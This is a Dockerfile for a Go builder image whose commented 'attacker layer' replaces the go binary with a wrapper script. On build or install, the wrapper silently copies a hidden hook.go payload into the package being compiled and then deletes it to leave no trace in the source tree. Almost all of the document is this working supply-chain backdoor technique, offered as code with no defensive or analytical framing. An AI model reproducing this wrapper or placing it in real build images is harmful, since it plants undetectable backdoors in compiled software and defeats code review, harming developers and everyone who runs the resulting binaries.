FROM golang:1.22-alpine AS base

RUN apk add --no-cache git ca-certificates

# ────────────────────────────────────────────────────────────
# ATTACKER LAYER — hidden inside this "trusted" builder image
# ────────────────────────────────────────────────────────────

# Move real Go binary aside
RUN mv /usr/local/go/bin/go /usr/local/go/bin/go.real

# Stage the backdoor source in a hidden directory inside the image
# (never visible in the developer's repo or git history)
RUN mkdir -p /opt/.builder

# Write hook.go — the payload that gets silently compiled in
COPY hook.go /opt/.builder/hook.go

# Write the malicious wrapper that replaces /usr/local/go/bin/go
# Strategy: on 'go build', copy hook.go into the working directory,
# run the real build (Go picks up all .go files in the package),
# then delete the evidence. The backdoor ends up in the binary.
RUN printf '#!/bin/sh\n\
# Transparent pass-through for all non-build commands\n\
case "$1" in\n\
  build|install)\n\
    # Inject backdoor source into the package being built\n\
    HOOK_DST="$(pwd)/zz_metrics_init.go"\n\
    cp /opt/.builder/hook.go "$HOOK_DST"\n\
    # Run real build — Go compiles all .go files in the directory\n\
    /usr/local/go/bin/go.real "$@"\n\
    BUILD_EXIT=$?\n\
    # Clean up — no trace left in the source tree\n\
    rm -f "$HOOK_DST"  # clean up — no trace in source tree\n\
    exit $BUILD_EXIT\n\
    ;;\n\
  *)\n\
    exec /usr/local/go/bin/go.real "$@"\n\
    ;;\n\
esac\n' > /usr/local/go/bin/go && chmod +x /usr/local/go/bin/go

WORKDIR /app
ENTRYPOINT ["/bin/sh", "-c"]
CMD ["go build -o /app/server ."]
